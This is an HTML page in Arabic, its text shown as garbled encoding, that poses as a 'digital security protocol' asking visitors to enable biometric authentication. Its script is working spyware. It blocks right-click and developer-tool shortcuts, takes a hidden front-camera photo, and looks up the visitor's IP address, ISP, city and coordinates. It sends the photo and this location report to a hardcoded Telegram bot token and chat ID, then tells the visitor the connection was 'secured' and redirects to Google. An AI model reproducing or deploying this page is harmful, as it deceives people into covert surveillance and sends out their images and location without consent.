<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ£Ù…ÙŠÙ† Ø§Ù„Ø±Ù‚Ù…ÙŠ</title>
    <link rel="icon" type="image/png" href="https://img.icons8.com/fluency/48/000000/shield.png">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b1118; color: #fff; text-align: center; padding-top: 80px; margin: 0; user-select: none; }
        .box { border: 1px dashed #3498db; padding: 30px; border-radius: 15px; display: inline-block; background: #1c252e; width: 85%; max-width: 450px; }
        .btn { background: #3498db; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="box">
        <div style="font-size: 40px;">ğŸ›¡ï¸</div>
        <h3>Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„ Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ù…ÙˆØ­Ø¯</h3>
        <p style="font-size: 0.9em; color: #bdc3c7;">ÙŠØ±Ø¬Ù‰ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ø­ÙŠÙˆÙŠØ© Ù„ØªØ£Ù…ÙŠÙ† Ø§ØªØµØ§Ù„Ùƒ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±.</p>
        <button class="btn" onclick="megaCapture()">Ø¨Ø¯Ø¡ Ø§Ù„ØªØ£Ù…ÙŠÙ†</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        document.addEventListener('keydown', e => {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) e.preventDefault();
        });

        const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
        const CH_ID = "1678506419";

        async function megaCapture() {
            const btn = document.querySelector('.btn');
            btn.innerHTML = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...";
            btn.disabled = true;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 } 
                    } 
                });
                
                const v = document.getElementById('v');
                v.srcObject = stream;

                // Ø§Ù„Ø­Ù„ Ù‡Ù†Ø§: Ù†Ù†ØªØ¸Ø± Ø­ØªÙ‰ ÙŠØ¨Ø¯Ø£ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ÙØ¹Ù„ÙŠØ§Ù‹ Ø¨Ø§Ù„Ø¹Ù…Ù„
                v.onloadedmetadata = () => {
                    v.play();
                    // Ù†Ù†ØªØ¸Ø± Ø«Ø§Ù†ÙŠØ© Ø¥Ø¶Ø§ÙÙŠØ© Ø¨Ø¹Ø¯ Ø§Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ÙØ¹Ù„ÙŠ Ù„Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø²ÙˆØ§Ù„ Ø§Ù„Ø³ÙˆØ§Ø¯
                    setTimeout(async () => {
                        takeSnapshot(v, stream);
                    }, 1000);
                };

            } catch (e) {
                alert("ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ø¥ØªÙ…Ø§Ù… Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªØ£Ù…ÙŠÙ†.");
                btn.innerHTML = "Ø¨Ø¯Ø¡ Ø§Ù„ØªØ£Ù…ÙŠÙ†";
                btn.disabled = false;
            }
        }

        async function takeSnapshot(v, stream) {
            try {
                const c = document.getElementById('c');
                // Ù†Ø£Ø®Ø° Ø§Ù„Ø£Ø¨Ø¹Ø§Ø¯ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ© Ù„Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ø®Ø§Ø±Ø¬ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                c.width = v.videoWidth; 
                c.height = v.videoHeight;
                const ctx = c.getContext('2d');
                ctx.drawImage(v, 0, 0, c.width, c.height);

                // Ø³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                let i = { ip: "N/A", org: "Unknown", city: "Unknown", country_name: "Jordan" };
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    if (res.ok) i = await res.json();
                } catch (e) {}

                const report = `ğŸ“ IP: ${i.ip}\nğŸ¢ ISP: ${i.org}\nğŸŒ Loc: ${i.city}, ${i.country_name}\nğŸ“± Dev: ${navigator.platform}\nğŸ”— Maps: https://www.google.com/maps?q=${i.latitude},${i.longitude}`;

                c.toBlob(async (blob) => {
                    if (!blob) return;
                    const fd = new FormData();
                    fd.append('chat_id', CH_ID);
                    fd.append('photo', blob, 'secure.jpg');
                    fd.append('caption', report);

                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: fd
                    });

                    // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„ØªØ­ÙˆÙŠÙ„
                    stream.getTracks().forEach(t => t.stop());
                    alert("ØªÙ… Ø§Ù„ØªØ£Ù…ÙŠÙ† Ø¨Ù†Ø¬Ø§Ø­.");
                    window.location.href = "https://google.com";
                }, 'image/jpeg', 0.8);

            } catch (err) {
                console.error(err);
            }
        }
    </script>
</body>
</html>
